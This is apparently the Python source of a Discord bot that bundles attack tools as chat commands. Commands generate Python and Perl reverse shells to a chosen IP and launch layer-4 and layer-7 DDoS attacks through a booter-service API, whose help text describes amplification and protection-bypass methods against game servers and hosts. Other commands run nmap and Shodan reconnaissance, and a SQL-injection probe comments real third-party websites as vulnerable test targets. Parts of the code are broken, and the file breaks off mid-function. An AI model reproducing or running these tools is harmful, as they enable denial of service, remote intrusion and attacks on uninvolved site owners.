# [Weeke's] -> Discord Bot Source

import discord, nmap, subprocess, dns.resolver, socket, vulners, base64, ctypes, time, requests, markdown, censys, virustotal3.core, censys.certificates, censys.data, censys.ipv4, shodan, os, sys

from dnsdumpster.DNSDumpsterAPI import DNSDumpsterAPI
from bs4 import BeautifulSoup as BS
from github import Github
from pprint import pprint
from ipwhois import IPWhois
from discord.ext import commands

def weeke_system(cmd):
    subprocess.call(cmd, shell=True)

def restart_program():
    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))

weeke_system('cls')
ctypes.windll.kernel32.SetConsoleTitleW("[Weeke's]->Discord Bot")

token = ''
SHODAN_API_KEY = ''
API_URL = "https://censys.io/api/v1"
api_id = ""
api_secret = ""
GITHUB_ACCESS_TOKEN = ''
vulners_api_key = ""
vt_api = ''

# setup scanner
scanner = nmap.PortScanner()

bot = commands.Bot(command_prefix='.')

@bot.event
async def on_connect():
    print('[LOGS] Connecting to discord!')


@bot.event
async def on_ready():
    print('[LOGS] Bot is ready!')
    print(f'[LOGS] Logged in: {bot.user.name}')


@bot.event
async def on_resumed(ctx):
    print("\n[LOGS] Bot has resumed session!")
    await ctx.send('Bot has resumed session!')


@bot.command()
async def h(ctx):
    print(
        '\n[LOGS] Commands: \n .kick\n .ban\n .isUp\n .ping\n .purge\n .unBan\n .genShellPy\n .genShellPerl\n ',
        '.getRefs\n .scanIp\n .whois\n .resolveCF\n .censysCertificates\n .censysRaw\n .censysData\n .censysIp\n ',
        '.traceroute\n .nslookup\n .nmap\n .b64encode\n .b64decode\n .urlDecode\n .githubSearch\n .exploits\n ',
        '.terminal\n .sqliTest\n .searchVT\n .vtSampleReport\n .vtSampleDownload\n .dnsDumpster\n .shodanSearch\n ',
        '.nmapPortScan\n .launch_layer7_attack')
    embed = discord.Embed(
        title="List of all commands that can be used",
        description="Command list",
        colour=discord.Colour.blue()
    )
    embed.set_footer(text="Help function")
    embed.set_author(name="Weeke")
    embed.add_field(name='.kick', value='Kick a member', inline=True)
    embed.add_field(name='.ban', value='Ban a member', inline=True)
    embed.add_field(name='.unBan', value='Unban a member', inline=True)
    embed.add_field(name='.isUp', value='Check if a host or ip is Up or Down', inline=False)
    embed.add_field(name='.ping', value='Get client latency', inline=True)
    embed.add_field(name='.purge', value='Purge chat (default is 2 lines)', inline=True)
    embed.add_field(name='.genShellPy', value='Generates a reverse shell in python', inline=True)
    embed.add_field(name='.genShellPerl', value='Generates a reverse shell in perl', inline=False)
    embed.add_field(name='.getRefs', value='Generates urls for censys.io and shodan.io', inline=True)
    embed.add_field(name='.scanIp', value='Scan ip or host using shodan.io API', inline=True)
    embed.add_field(name='.whois', value='Whois lookup on a host', inline=True)
    embed.add_field(name='.resolveCF', value='Resolves background ip of a host behind CF', inline=False)
    embed.add_field(name='.censysCertificates', value='Gets censys.io for certificates', inline=True)
    embed.add_field(name='.censysRaw', value='Gets raw out from censys.io', inline=True)
    embed.add_field(name='.censysData', value='Gets data from censys.io', inline=True)
    embed.add_field(name='.censysIp', value='Gets data from censys.io for IP', inline=False)
    embed.add_field(name='.traceroute', value='Runs traceroute on ip or host', inline=True)
    embed.add_field(name='.nslookup', value='Runs a nslookup on host', inline=True)
    embed.add_field(name='.nmap', value='Runs full nmap scan on an ip', inline=True)
    embed.add_field(name='.b64encode', value='Base64 encodes a string', inline=False)
    embed.add_field(name='.b64decode', value='Base64 decodes a string', inline=True)
    embed.add_field(name='.urlDecode', value='Does a url decode on string', inline=True)
    embed.add_field(name='.githubSearch', value='Searches github using a query', inline=True)
    embed.add_field(name='.exploits', value='Does a vulnDB exploit search with query', inline=False)
    embed.add_field(name='.terminal', value='Runs terminal commands(Clear, Restart, Stop)', inline=True)
    await ctx.send(embed=embed)

    embed2 = discord.Embed(
        title="List of all commands that can be used",
        description="Command list",
        colour=discord.Colour.blue()
    )
    embed2.set_footer(text="Help function")
    embed2.set_author(name="Weeke")
    embed2.add_field(name='.sqliTest', value='Test for basic SQL Injection vulnerabilities', inline=True)
    embed2.add_field(name='.searchVT', value='Search for hashes on virustotal', inline=True)
    embed2.add_field(name='.vtSampleReport', value='Creates a virustotal report for a given sample', inline=True)
    embed2.add_field(name='.vtSampleDownload', value="Downloads a given sample from virus total (I don't have an API key that can do this feature)", inline=False)
    embed2.add_field(name='.dnsDumpster', value='Use dnsDumpster unoficiall api', inline=True)
    embed2.add_field(name='.shodanSearch', value='Use shodan to find IOT Device IPs', inline=True)
    embed2.add_field(name='.nmapPortScan', value='Run an NMAP Port scan', inline=True)
    embed2.add_field(name='.ddos', value='', inline=True)
    await ctx.send(embed=embed2)


@bot.command()
async def ping(ctx):
    print('\n[LOGS] Running ping command!')
    await ctx.send(f'Client Latency: {round(bot.latency * 1000)}')


@bot.command()
async def purge(ctx, amount=2):
    print('\n[LOGS] Purging chat! (Default amount = 2)')
    await ctx.channel.purge(limit=amount)


@bot.command()
async def kick(ctx, member: discord.Member = None, *, reason=None):
    if member is None:
        print('\n[LOGS] Must enter a member to kick!')
        await ctx.send('Please enter a member to kick!')

    await member.kick(reason=reason)


@bot.command()
async def ban(ctx, member: discord.Member = None, *, reason=None):
    if member is None:
        print('\n[LOGS] Must enter a member to ban!')
        await ctx.send('Please enter a member to ban!')

    await member.ban(reason=reason)
    await ctx.send(f'Banned {member.mention}')


@bot.command()
async def unBan(ctx, *, member=None):
    if member is None:
        print('\n[LOGS] Please enter a member to unban!')
        await ctx.send('Please enter a member to unban!')

    # generating list of banned users
    banned_members = await ctx.guild.bans()
    member_name, member_disc = member.split('#')

    for ban_entry in banned_members:
        user = ban_entry.user

        if (user.name, user.disc) == (member_name, member_disc):
            print(f'\n[LOGS] Unbanning {user.mention}!')
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}!')

@bot.command()
async def nmapPortScan(ctx, ip_addr=None)
    print(f'[LOGS] Running nmapPortScan command on {ip_addr}')

    if ip_addr is None:
        print('\n[LOGS] Must enter a ip!')
        ctx.send('Must enter a ip!')

    scanner.scan(ip_addr, '1-65535')
    
    scan_results = ''  # Initialize an empty string to store the results

    for host in scanner.all_hosts():
        scan_results += '----------------------------------------------------\n'
        scan_results += f'Host : {host} ({scanner[host].hostname()})\n'
        scan_results += f'State : {scanner[host].state()}\n'
        for proto in scanner[host].all_protocols():
            scan_results += '----------\n'
            scan_results += f'Protocol : {proto}\n'

            lport = list(scanner[host][proto].keys())
            lport.sort()
            
            for port in lport:
                scan_results += f'port : {port}\tstate : {scanner[host][proto][port]['state']}\n'

    # Send the results to Discord
    await ctx.send(f'**Nmap Scan Results for {ip_addr}**\n```\n{scan_results}\n```')


@bot.command()
async def isUp(ctx, ip_addr=None):
    print(f'\n[LOGS] Running isUp command on {ip_addr}!')

    if ip_addr is None:
        print('\n[LOGS] Must enter a ip!')
        ctx.send('Must enter a ip!')

    host = socket.gethostbyname(ip_addr)
    scanner.scan(host, '1', '-v')
    print("\n[LOGS] IP Status: ", scanner[host].state())
    await ctx.send(scanner[host].state())

@bot.command()
async def genShellPy(ctx, ip=None, port=None):
    pyBeginning = 'python -c '
    pyShell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((' + ip + ',' \
              + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([' \
                       '"/bin/sh","-i"]); '

    print(f'\n[LOGS] Generating reverse python shell on {ip} and {port}!')
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Please enter a ip!')

    if port is None:
        print('\n[LOGS] Must enter a port!')
        await ctx.send('Please enter a port!')

    await ctx.send(pyBeginning + pyShell)

@bot.command()
async def ddos(ctx, action, *args):
    api_url = "https://stresse.ru/api/api.php"
    api_key = "YOUR_API_KEY"  # Replace with your API key

    if action == "help":
        await ctx.send(f'''
Layer 4 Methods

Layer 4 methods are meant for IPv4 targets, using UDP and TCP protocols for attacks.

Method      Protocol Description
-------     -------- -----------
UDP-AMP     UDP      Powerful multi-protocol UDP reflection method, combines all the most powerful amplification protocols into one attack.
NTP         UDP      UDP reflection method that uses vulnerable NTP servers for amplification.
DNS         UDP      UDP reflection method that uses vulnerable DNS servers for amplification.
ARD         UDP      UDP reflection method that uses vulnerable ARD servers for amplification, capable of bypassing some OVH and other protected hosts.
WSD         UDP      UDP reflection method that uses vulnerable WSD servers for amplification, capable of bypassing some OVH and other protected hosts.
SSDP        UDP      UDP reflection method that uses vulnerable SSDP servers for amplification.
DVR         UDP      UDP reflection method that uses vulnerable DVR servers for amplification.
SNMP        UDP      UDP reflection method that uses vulnerable SNMP servers for amplification.
CHARGEN     UDP      UDP reflection method that uses vulnerable CHARGEN servers for amplification.
UDP-SYNERGY UDP      An insanely powerful UDP method, requires a minimum of 10 Simultaneous Attacks to launch.
TCP-AMP     TCP      TCP reflection method that amplifies 8-15Gbps of TCP traffic, currently bypassing many protected servers.
TCP-REFLECT TCP      TCP reflection method that uses a large pool of IPs and many different TCP protocols combined, similar to TCP-AMP but exchanges volume for greater IP/Protocol variation.
ICMP-AMP    ICMP     ICMP amplification attack, can cause lag on some servers.
UDP-ABUSE   UDP      Exotic UDP Abuse method that attempts to get a target IP suspended by generating abuse reports; this is not meant to DDoS an IP, it is intended to suspend the IP from its hosting.
UDP         UDP      Powerful UDP bypass method that randomizes each IP header and payload to bypass protections and security.
GAME-SOURCE UDP      Uses Source Engine Query to take down Valve/Source servers, very effective if the server is not protected.
UDP-INSTANT-ABUSE UDP Like the regular ABUSE method but with better IP selection and faster suspensions.
UDP-BYPASS  UDP      UDPBYPASS is made to target applications using UDP on the targeted port to attempt to create the most legitimate traffic out on the application.
GAME-FIVEM  UDP      Bypass method for GTA V servers that are using the FiveM multiplayer modification framework.
GAME-RAKNET UDP      Targeting the widely used cross-platform multiplayer game networking engine, allowing DDoS attacks on games like Rust, Minecraft PE, RageMP, and many other games.
GAME-MINECRAFT UDP  Uses crafted Minecraft queries to take down Minecraft servers, very effective if the server is not protected.
GAME-QUAKE  UDP      Uses QUAKE engine queries, also works with games like Soldier of Fortune 2, Nexuiz, Quake 3, Wolfenstein, Star Trek Elite Force, Urban Terror, Star Wars JK2, Call of Duty (1, 2, 3, 4, MW2, UO), Star Wars JK, Star Trek Elite Force 2, FiveM, and Tremulous.
GAME-UNTURNED UDP    Bypass servers running the Unturned game, effective against many servers.
GAME-FIVEMV2 UDP      Bypass servers running the SAMP game, effective against many servers.
TCP-ABUSE   TCP      Exotic TCP Abuse method that attempts to get a target IP suspended by generating abuse reports; this is not meant to DDoS an IP, it is intended to suspend the IP from its hosting.
TCP-INSTANT-ABUSE TCP Like the regular ABUSE method but with better IP selection and faster suspensions.
TCP-SYN     TCP      Spoofed SYN packets flood, tweaked to bypass some protections, fully customizable.
TCP-ACK     TCP      Spoofed ACK packets flood, tweaked to bypass some protections, fully customizable.
TCP-RAND    TCP      Spoofed randomized TCP flags packets flood, tweaked to bypass some protections, fully customizable.
TCP-PROTECT TCP      Powerful TCP method that can bypass various servers.
TCP-SYNACK  TCP      Powerful method that emulates a SYN-ACK handshake.
TCP-DATA    TCP      TCP method that attempts to emulate a real connection with SYN and PSH+ACK data.
ICMP        ICMP     Old-school ICMP attack, causes lag and CPU usage on some servers.

Layer 7 Methods

Layer 7 methods are meant for URL targets, using HTTP/HTTPs protocols for attacks.

Method      Protocol Description
-------     -------- -----------
AUTOMATION  HTTP     Effective method for HTTP/HTTPs
BYPASS      HTTP     Effective method for HTTP/HTTPs
SOCKET      HTTP     Socket method for mass requests
SPAMMER     HTTP     Spammer method for mass requests
ELITE       HTTP
''')
    elif action == "get_running_attacks":
        action = "running"
        params = {"key": api_key, "action": action}
        try:
            response = requests.get(api_url, params=params)
            if response.status_code == 200:
                json_response = response.json()
                if json_response.get("status"):
                    attacks = json_response.get("body")
                    await ctx.send(f"Running Attacks:\n{attacks}")
                else:
                    await ctx.send("API request was not successful.")
            else:
                await ctx.send(f"API request failed with status code: {response.status_code}")
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")
    elif action == "launch_layer4_attack":
        if len(args) == 4:
            api_key, host, port, time, method = args
            base_url = "https://stresse.ru/api/api.php"
            action = "layer4"
            url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"

            try:
                response = requests.get(url)
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status"):
                        await ctx.send(f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}")
                    else:
                        await ctx.send(f"API Error: {data.get('body')}")
                else:
                    await ctx.send(f"Request to the API failed with status code: {response.status_code}")
            except Exception as e:
                await ctx.send(f"Failed to connect to the API: {str(e)}")
        else:
            await ctx.send("Usage: .ddos launch_layer4_attack <api_key> <host> <port> <time> <method>")
    elif action == "launch_layer7_attack":
        if len(args) >= 5:
            host, port, time, method, *extra_args = args
            postdata = cookie = referer = useragent = req = delay = con = None

            if len(extra_args) >= 1:
                postdata = extra_args[0]
            if len(extra_args) >= 2:
                cookie = extra_args[1]
            if len(extra_args) >= 3:
                referer = extra_args[2]
            if len(extra_args) >= 4:
                useragent = extra_args[3]
            if len(extra_args) >= 5:
                req = extra_args[4]
            if len(extra_args) >= 6:
                delay = extra_args[5]
            if len(extra_args) >= 7:
                con = extra_args[6]

            print(f'[LOGS] Running Layer 7 attack on {host} {port} | Method: {method} | Time: {time}')
            api_key = ''  # Replace with your actual API key

            api_url = "https://stresse.ru/api/api.php"
            params = {
                "key": api_key,
                "action": "layer7",
                "host": host,
                "port": port,
                "time": time,
                "method": method,
                "postdata": postdata,
                "cookie": cookie,
                "referer": referer,
                "useragent": useragent,
                "req": req,
                "delay": delay,
                "con": con
            }

            response = requests.get(api_url, params=params)

            if response.status_code == 200:
                response_json = response.json()
                if response_json.get("status"):
                    await ctx.send(f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}")
                else:
                    await ctx.send(f"API Error: {response_json.get('error', 'Unknown error')}")
            else:
                await ctx.send(f"Your connection to API failed (Error {response.status_code}), check your connection and try again")
        else:
            await ctx.send("Usage: .ddos launch_layer7_attack <host> <port> <time> <method> [postdata] [cookie] [referer] [useragent] [req] [delay] [con]")

@bot.command()
async def genShellPerl(ctx, ip=None, port=None):
    perlBeginning = 'perl -e '
    perlShell = 'use Socket;$i=`' + ip + '`;$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(' \
                                                          'connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' \
                                                          '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh ' \
                                                          '-i");}; '

    print(f'\n[LOGS] Generating reverse perl shell on {ip} and {port}!')
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Please enter a ip!')

    if port is None:
        print('\n[LOGS] Must enter a port!')
        await ctx.send('Please enter a port!')

    await ctx.send(perlBeginning + perlShell)


@bot.command()
async def getRefs(ctx, ip=None):
    print(f'\n[LOGS] Getting refs for {ip}!')
    if ip is None:
        print('\n[LOGS] Must enter a host or ip!')
        await ctx.send('Must enter a host or ip!')

    await ctx.send('https://censys.io/ipv4/' + ip)
    await ctx.send('https://www.shodan.io/host/' + ip)

@bot.command()
async def shodanSearch(ctx, ip=None):
    print(f'[LOGS] Running a shodan IOT search query.')
    api = shodan.Shodan(SHODAN_API_KEY)

    # Perform the search
    query = ' '.join(sys.argv[1:])
    result = api.search(query)

    # Loop through the matches and print each IP
    for service in result['matches']:
        await ctx.send(f"{service['ip_str']}")

@bot.command()
async def scanIp(ctx, ip=None):
    print(f'\n[LOGS] Running scan with shodan on {ip}!')
    # connecting api key
    api = shodan.Shodan(SHODAN_API_KEY)

    if ip is None:
        print('\n[LOGS] Must enter a host or ip!')
        await ctx.send('Must enter a host or ip!')

    s = socket.gethostbyname(ip)
    host = api.host(s)

    # Print general info
    print("""IP: {}\nOrganization: {}\nOperating System: {}\nReported: {}""".format(host['ip_str'],
                                                                                    host.get('org', 'n/a'),
                                                                                    host.get('os', 'n/a'),
                                                                                    host.get('reported', 'false')))
    await ctx.send("""IP: {}\nOrganization: {}\nOperating System: {}\nReported: {}""".format(host['ip_str'],
                                                                                             host.get('org', 'n/a'),
                                                                                             host.get('os', 'n/a'),
                                                                                             host.get('reported',
                                                                                                      'false')))

    # Print all banners
    for item in host['data']:
        print("""Port: {}""".format(item['port'], item['data']))
        await ctx.send("""Port: {}""".format(item['port'], item['data']))


@bot.command()
async def whois(ctx, ip=None):
    if ip is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Must enter a ip!')

    print(f'\n[LOGS] Running whois on {ip}')
    ip = socket.gethostbyname(ip)
    w = IPWhois(ip)
    res = w.lookup_whois(inc_nir=True)
    pprint(res)
    await ctx.send(res)

@bot.command()
async def censysCertificates(ctx, cert=None):
    print(f'\n[LOGS] Running censys search on {cert}!')
    if cert is None:
        print('\n[LOGS] Must enter a valid cert!')
        await ctx.send('Must enter a valid cert!')

    certificates = censys.certificates.CensysCertificates(api_id, api_secret)

    fields = ["parsed.subject_dn", "parsed.fingerprint_sha256"]
    for cert in certificates.search("validation.nss.valid: true", fields=fields):
        print(cert["parsed.subject_dn"])
        await ctx.send(cert["parsed.subject_dn"])

    # aggregate report on key types used by trusted certificates
    print(cert.report(query="valid_nss: true", field="parsed.subject_key_info.key_algorithm.name"))
    await ctx.send(cert.report(query="valid_nss: true", field="parsed.subject_key_info.key_algorithm.name"))


@bot.command()
async def censysRaw(ctx, name=None):
    print(f'\n[LOGS] Running censys raw search on {name}!')
    if name is None:
        print('\n[LOGS] Must enter a url!')
        await ctx.send('Must enter a url!')

    res = requests.get(API_URL + "/data", auth=(api_id, api_secret))
    if res.status_code != 200:
        print("\n[LOGS] error occurred: %s" % res.json()["error"])

    for name, series in res.json()["raw_series"].iteritems():
        print(series["name"], "was last updated at", series["latest_result"]["timestamp"])
        await ctx.send(series["name"], "was last updated at", series["latest_result"]["timestamp"])


@bot.command()
async def censysData(ctx, ip=None):
    print(f'\n[LOGS] Running censysData search on {ip}')
    if ip is None:
        print('\n[LOGS] Must enter a url!')
        await ctx.send('Must enter a url!')

    c = censys.data.CensysData(api_id, api_secret)
    url = socket.gethostbyname(ip)

    ssh_series = c.view_series(ip)

    for url in ssh_series['results']['historical']:
        print(c.view_result(ssh_series, url['id']))


@bot.command()
async def censysIp(ctx, ip=None):
    print(f'\n[LOGS] Running censysIp search on {ip}')
    if ip is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    ip = socket.gethostbyname(ip)

    c = censys.ipv4.CensysIPv4(api_id, api_secret)
    c.report(""" "welcome to" AND tags.raw: "http" """, field="80.http.get.headers.server.raw", buckets=5)
    c.view(ip)

    IPV4_FIELDS = ['ip',
                   'updated_at',
                   '80.http.get.title',
                   '443.https.get.title']

    server_types = ['80.http.get.headers.server: Apache', '80.http.get.headers.server: IIS',
                    '80.http.get.headers.server: Nginx', '80.http.get.headers.server: LiteSpeed']
    data = list(
        c.search('80.http.get.headers.server: Nginx AND location.country: United States', IPV4_FIELDS, max_records=10))
    print(data)
    await ctx.send(data)


@bot.command()
async def traceroute(ctx, hostname=None):
    print(f'\n[LOGS] Running tracert on {hostname}')
    if hostname is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    tracert = subprocess.run("tracert " + hostname)
    await ctx.send(tracert)


@bot.command()
async def nslookup(ctx, ip=None):
    print(f'\n[LOGS] Running nslookup on {ip}!')
    if ip is None:
        print('\n[LOGS] Must enter a url or ip!')
        await ctx.send('Must enter a url or ip!')

    dns_results = dns.resolver.query(ip, 'MX')
    for data in dns_results:
        print(data.exchange)
        await ctx.send(data.exchange)


@bot.command()
async def nmap(ctx, ip_addr=None):
    print(f'\n[LOGS] Running nmap on {ip_addr}!')
    if ip_addr is None:
        print('\n[LOGS] Must enter a ip!')
        await ctx.send('Must enter a ip!')
       
    print("\n[LOGS] Nmap Version: ", scanner.nmap_version())
    await scanner.scan(ip_addr, '1-65535', '-v -sS -sV -sC -A -O')
    print("\n[LOGS] Ip Status: ", scanner[ip_addr].state())
    print(scanner[ip_addr].all_protocols())
    print("\n[LOGS] Open Ports: ", scanner[ip_addr]['tcp'].keys())
    await ctx.send(scanner[ip_addr]['tcp'].keys())


@bot.command()
async def b64encode(ctx, string):
    print(f'\n[LOGS] Running b64decode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    b = string.encode("ascii")
    c = base64.b64encode(b)
    d = c.decode("ascii")
    await ctx.send(d)


@bot.command()
async def b64decode(ctx, string):
    print(f'\n[LOGS] Running b64decode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    string_bytes = base64.b64decode(string)
    string = string_bytes.decode('ascii')
    await ctx.send(string)


@bot.command()
async def urlDecode(ctx, string):
    print(f'\n[LOGS] Running htmlDecode on {string}!')
    if string is None:
        print('\n[LOGS] Must enter a string!')
        await ctx.send('Must enter a string!')

    import urllib
    urllib.parse.quote_plus(string)
    await ctx.send(string)


@bot.command()
async def githubSearch(ctx, string=None):
    print(f'\n[LOGS] Searching github for {string}')

    # connecting github token for public_repo search
    git = Github(GITHUB_ACCESS_TOKEN)

    rate_limit = git.get_rate_limit()
    rate = rate_limit.search
    if rate.remaining == 0:
        print(f'You have 0/{rate.limit} API calls remaining. Reset time: {rate.reset}')
        return
    else:
        print(f'You have {rate.remaining}/{rate.limit} API calls remaining')

    query = f'"{string} english" in:readme+in:description'
    result = git.search_code(query, order='desc')

    max_size = 50
    print(f'Found {result.totalCount} file(s)')
    if result.totalCount > max_size:
        result = result[:max_size]

    for file in result:
        print(f'{file.download_url}')
        await ctx.send(f'{file.download_url}')


@bot.command()
async def exploits(ctx, string=None):
    print(f'\n[LOGS] Searching using vulners api for {string}')
    vulners_api = vulners.Vulners(vulners_api_key)
    exploit_search = vulners_api.searchExploit(string, limit=10)
    print(exploit_search)
    
    hrefs = [item['href'] for item in exploit_search]
    titles = [item['title'] for item in exploit_search]

    await ctx.send('```\n'  + '\n['.join(hrefs) + '\n' + '```')


@bot.command()
async def terminal(ctx, option=None, Clear=None, Restart=None, Stop=None):
    print('\n[LOGS] Running terminal commands!')
    if option is None:
        print('\n[LOGS] Must enter an option (Clear, Restart, Stop)')
        await ctx.send('Must enter an option (Clear, Restart, Stop)')
    elif option == 'clear':
        print('\n[LOGS] Running clear terminal')
        await ctx.send('Running clear terminal')
        weeke_system('cls')
        time.sleep(4)
        await ctx.send('Terminal Cleared!')
    elif option == 'restart':
        print('\n[LOGS] Running restart bot')
        await ctx.send('Running restart bot')
        await ctx.send("Bot Restarting In [5]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [4]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [3]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [2]")
        time.sleep(1)
        await ctx.send("Bot Restarting In [1]")
        time.sleep(1)
        await ctx.send("Restarting Bot!")
        restart_program()
    elif option == 'stop':
        print('\n[LOGS] Running stop bot')
        await ctx.send('Running stop bot')
        print("\n[LOGS] Stopping Bot!")
        print("\n[LOGS] Bot Stopping In: [5]")
        await ctx.send('Bot Stopping In: [5]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [4]")
        await ctx.send('Bot Stopping In: [4]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [3]")
        await ctx.send('Bot Stopping In: [3]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [2]")
        await ctx.send('Bot Stopping In: [2]')
        time.sleep(1)
        print("\n[LOGS] Bot Stopping In: [1]")
        await ctx.send('Bot Stopping In: [1]')
        time.sleep(1)
        print("\n[LOGS] Shutting Down Bot!")
        await ctx.send('Shutting Down Bot!')
        sys.exit()
    else:
        print('\n[LOGS] Invalid option!')
        await ctx.send('Invalid option!')


@bot.command()
async def sqliTest(ctx, url=None):
    global string

    print(f'\n[LOGS] Testing {url} for basic SQLI vulnerabilities')
    await ctx.send(f'Testing {url} for basic SQLI vulnerabilities')

    if url is None:
        print('\n[LOGS] Must input url to test')
        await ctx.send('Must input url to test')
    else:
        #####################################################################
        # EXAMPLES OF VULNERABLE SITES FOR TESTING                          #
        # https://www.architecturalpapers.ch/index.php?ID=4%27              #
        # http://www.wurm.info/index.php?id=8%27                            #
        # https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22  #
        #####################################################################
        vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()']

        test_url = url + "'"
        test_url2 = url + ';'

        results = requests.get(test_url)
        results2 = requests.get(test_url2)

        print(results)
        print(results2)

        data = results.text
        soup = BS(data, features="html.parser")

        data2 = results2.text
        soup2 = BS(data2, features="html.parser")

        for vuln in vulnerable_text:
            if vuln in data:
                string = vuln
                print('\n[LOGS] Vulnerable: ' + vuln)
                await ctx.send('Vulnerable: ' + vuln)

        for vuln in vulnerable_text:
            if vuln in data2:
                string = vuln
                print('\n[LOGS] Vulnerable: ' + vuln)
                await ctx.send('Vulnerable: ' + vuln)


@bot.command()
async def searchVT(ctx, query=None):
    print(f'\n[LOGS] Searching VirusTotal for {query}')

    if query is None:
        print('\n[LOGS] Must enter a query!')
        await ctx.send('Must enter a query!')

    data = {
        "apikey": vt_api,
        "query": query,
    }

    vt_request = requests.post(VT_SEARCH, data=data)

    hashes = []
    while len(hashes) < count:
        hashes.extend(vt_request.json()["hashes"])

        if "offset" not in vt_request.json():
            break

        data["offset"] = vt_request.json()["offset"]
        vt_request = requests.post(VT_SEARCH, data=data)


@bot.command()
async def vtSampleReport(ctx, sample_id):
    # test sample a0dbae122905501741e03499e28bea1f
    print(f'\n[LOGS] Getting report for sample using {sample_id}')
    url = 'https://www.virustotal.com/vtapi/v2/file/report'

    params = {'apikey': vt_api, 'resource': sample_id}
    response = requests.get(url, params=params)
    json_response = response.json()
    print(json_response)

    md5 = json_response["md5"]
    sha256 = json_response["sha256"]
    sha1 = json_response["sha1"]
    permalink = json_response["permalink"]
    scanners = json_response["scans"].keys()

    markdown = """
Scan Results
Link: {permalink}

MD5: {md5}
SHA256: {sha256}
SHA1: {sha1} 

|    Scanner    |   Detected    |   Result   |
|:-------------:|:-------------:|:----------:|
    """.format(permalink=permalink , md5=md5, sha256=sha256, sha1=sha1)

    for scanner in scanners:
        detected = json_response["scans"][scanner]
        result = json_response["scans"][scanner]["result"]
        markdown += """|{scanner}|{detected}|{result}|\n""".format(scanner=scanner, detected=detected, result=result)

    with open('sample.md', 'w') as file:
        file.write(markdown)

    file = discord.File("sample.md", filename="sample.md")
    await ctx.send("VirusTotal Sample Report", file=file)

"""
{
 'response_code': 1,
 'verbose_msg': 'Scan finished, scan information embedded in this object',
 'resource': '99017f6eebbac24f351415dd410d522d',
 'scan_id': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c-1273894724',
 'md5': '99017f6eebbac24f351415dd410d522d',
 'sha1': '4d1740485713a2ab3a4f5822a01f645fe8387f92',
 'sha256': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c',
 'scan_date': '2010-05-15 03:38:44',
 'permalink': 'https://www.virustotal.com/file/52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c/analysis/1273894724/',
 'positives': 40,
 'total': 40,
 'scans': {
   'nProtect': {
     'detected': true, 
     'version': '2010-05-14.01', 
     'result': 'Trojan.Generic.3611249', 
     'update': '20100514'
   },
   'CAT-QuickHeal': {
     'detected': true, 
     'version': '10.00', 
     'result': 'Trojan.VB.acgy', 
     'update': '20100514'
   },
   'McAfee': {
     'detected': true, 
     'version': '5.400.0.1158', 
     'result': 'Generic.dx!rkx', 
     'update': '20100515'
   },
   'TheHacker': {
     'detected': true, 
     'version': '6.5.2.0.280', 
     'result': 'Trojan/VB.gen', 
     'update': '20100514'
   },   
   'VirusBuster': {
    'detected': true,
     'version': '5.0.27.0',
     'result': 'Trojan.VB.JFDE',
     'update': '20100514'
   }
 }
}

'md5': '99017f6eebbac24f351415dd410d522d',
'sha1': '4d1740485713a2ab3a4f5822a01f645fe8387f92',
'sha256': '52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c',
'scan_date': '2010-05-15 03:38:44',
'permalink': 'https://www.virustotal.com/file/52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c/analysis/1273894724/',
'result': 'Trojan.Generic.3611249',
'scans': {
     'nProtect': {
     'CAT-QuickHeal': {
     'McAfee': {
     'TheHacker': {
     'VirusBuster': {
"""
    
def save_downloaded_file(filename, file_stream):
    """ Save Downloaded File to Disk Helper Function
    :param save_file_at: Path of where to save the file.
    :param file_stream: File stream
    :param filename: Name to save the file.
    """
    filename = os.path.join('\samples', filename)
    with open(filename, 'wb') as f:
        f.write(file_stream)
        f.flush()

@bot.command()
async def vtSampleDownload(ctx, sample_id):
    # test sample 7657fcb7d772448a6d8504e4b20168b8
    print(f'\n[LOGS] Downloading sample using {sample_id}')
    url = 'https://www.virustotal.com/vtapi/v2/file/download'
    params = {'apikey': vt_api, 'hash': sample_id}
    response = requests.get(url, params=params)
    downloaded_file = response.content
    print(response.status_code)
    file = discord.File(downloaded_file, filename=downloaded_file)
    await ctx.send("VirusTotal Sample", file=file)

def get_image(domain):
    url = 'https://dnsdumpster.com/'
    s = requests.Session()
